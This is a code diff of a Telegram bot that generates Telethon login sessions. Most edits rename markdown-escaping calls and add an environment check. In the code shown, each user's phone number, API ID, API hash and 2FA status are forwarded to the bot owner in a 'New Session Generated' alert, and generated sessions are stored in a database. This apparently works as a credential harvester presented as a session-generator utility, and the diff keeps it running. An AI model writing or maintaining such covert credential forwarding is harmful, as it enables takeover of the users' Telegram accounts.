@@ -72,8 +72,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.close()
 
     welcome_msg = (
-        f"👋 Welcome {utils.markdown.escape(user.first_name)}!\n"
-        f"📛 Username: @{utils.markdown.escape(user.username)}\n"
+        f"👋 Welcome {utils.escape_markdown(user.first_name)}!\n"
+        f"📛 Username: @{utils.escape_markdown(user.username)}\n"
         f"🆔 Your ID: {user.id}\n\n"
         "Use /cmds to see available commands"
     )
@@ -163,19 +163,19 @@ async def otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.commit()
         db.close()
 
-        safe_session = utils.markdown.escape(string_session)
+        safe_session = utils.escape_markdown(string_session)
         await update.message.reply_text(
             f"✅ Session generated:\n`{safe_session}`",
             parse_mode='MarkdownV2'
         )
-        await log_to_owner(update, context.user_data)
+        await log_to_owner(update, context, context.user_data)
         return ConversationHandler.END
     
     except SessionPasswordNeededError:
         await update.message.reply_text("Enter your 2FA password:")
         return TWOFA
     except Exception as e:
-        error_msg = utils.markdown.escape(f"❌ Error: {str(e)}\nContact @rishabh_zz")
+        error_msg = utils.escape_markdown(f"❌ Error: {str(e)}\nContact @rishabh_zz")
         await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
         return ConversationHandler.END
 
@@ -202,30 +202,30 @@ async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         db.commit()
         db.close()
 
-        safe_session = utils.markdown.escape(string_session)
+        safe_session = utils.escape_markdown(string_session)
         await update.message.reply_text(
             f"✅ Session generated:\n`{safe_session}`",
             parse_mode='MarkdownV2'
         )
-        await log_to_owner(update, context.user_data)
+        await log_to_owner(update, context, context.user_data)
         return ConversationHandler.END
     except Exception as e:
-        error_msg = utils.markdown.escape(f"❌ Error: {str(e)}\nContact @rishabh_zz")
+        error_msg = utils.escape_markdown(f"❌ Error: {str(e)}\nContact @rishabh_zz")
         await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
         return ConversationHandler.END
 
-async def log_to_owner(update, user_data):
+async def log_to_owner(update: Update, context: ContextTypes.DEFAULT_TYPE, user_data: dict):
     owner_id = int(os.getenv("OWNER_ID"))
     user = update.effective_user
     
-    safe_phone = utils.markdown.escape(user_data.get('phone', 'N/A'))
-    safe_api_id = utils.markdown.escape(str(user_data.get('api_id', 'N/A')))
-    safe_api_hash = utils.markdown.escape(user_data.get('api_hash', 'N/A'))
+    safe_phone = utils.escape_markdown(user_data.get('phone', 'N/A'))
+    safe_api_id = utils.escape_markdown(str(user_data.get('api_id', 'N/A')))
+    safe_api_hash = utils.escape_markdown(user_data.get('api_hash', 'N/A'))
     twofa_used = '✅' if 'twofa' in user_data else '❌'
     
     log_msg = (
         "⚠️ New Session Generated ⚠️\n"
-        f"User: {utils.markdown.escape(user.mention_markdown())}\n"
+        f"User: {utils.escape_markdown(user.mention_markdown())}\n"
         f"Phone: `{safe_phone}`\n"
         f"API_ID: `{safe_api_id}`\n"
         f"API_HASH: `{safe_api_hash}`\n"
@@ -239,7 +239,7 @@ async def log_to_owner(update, user_data):
     )
 
 async def handle_error(update: Update, error: Exception):
-    error_msg = utils.markdown.escape(f"❌ Error: {str(error)}\nContact @rishabh_zz")
+    error_msg = utils.escape_markdown(f"❌ Error: {str(error)}\nContact @rishabh_zz")
     await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
     logger.error(f"Error occurred: {str(error)}")
 
@@ -318,6 +318,14 @@ async def maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(maintenance_msg)
 
 def main():
+    # Validate environment variables
+    required_env_vars = ['BOT_TOKEN', 'OWNER_ID']
+    missing_vars = [var for var in required_env_vars if not os.getenv(var)]
+    
+    if missing_vars:
+        logger.error(f"Missing required environment variables: {', '.join(missing_vars)}")
+        return
+
     application = ApplicationBuilder().token(os.getenv("BOT_TOKEN")).build()
 
     # Create sessions directory if not exists
